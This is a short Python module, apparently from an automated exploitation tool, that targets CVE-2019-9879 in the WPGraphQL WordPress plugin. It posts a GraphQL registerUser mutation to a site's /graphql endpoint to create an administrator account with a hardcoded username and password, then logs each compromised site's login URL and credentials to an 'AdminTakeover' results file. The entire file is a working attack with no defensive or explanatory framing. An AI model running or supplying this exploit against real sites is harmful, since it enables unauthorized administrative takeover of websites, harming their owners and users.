# coding=utf-8
import json, requests
import printModule

headers = {
    'Content-type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
}


def Exploit(url, email):
    try:
        x = url + '/graphql'
        username = 'neko'
        password = 'tegal1337'
        response = requests.post('http://' + x, data=json.dumps({'': ''}), headers=headers)
        if response.status_code == 200:
            payload = {
                "query": "mutation{registerUser(input:{clientMutationId:\"UWHATM8\",email:\""+email+"\",password:\""+password+"\",username:\""+username+"\",roles:[\"administrator\"]}){clientMutationId}}"
            }
            response = requests.post('http://' + x, data=json.dumps(payload), headers=headers)
            if response.status_code == 200 and 'UWHATM8' in str(response.content):
                with open('result/AdminTakeover_results.txt', 'a') as writer:
                    writer.write(url + '/wp-login.php --> try to login and Check email: {}\n  Username: {}\n'
                                       '  Password: {}\n------------------------------------------\n'
                                 .format(email, username, password))
                return printModule.returnYes(url, 'CVE-2019-9879', 'WPGraphQL Add admin', 'Wordpress')
            else:
                return printModule.returnNo(url, 'CVE-2019-9879', 'WPGraphQL Add admin', 'Wordpress')
        else:
            return printModule.returnNo(url, 'CVE-2019-9879', 'WPGraphQL Add admin', 'Wordpress')
    except:
        return printModule.returnNo(url, 'CVE-2019-9879', 'WPGraphQL Add admin', 'Wordpress')
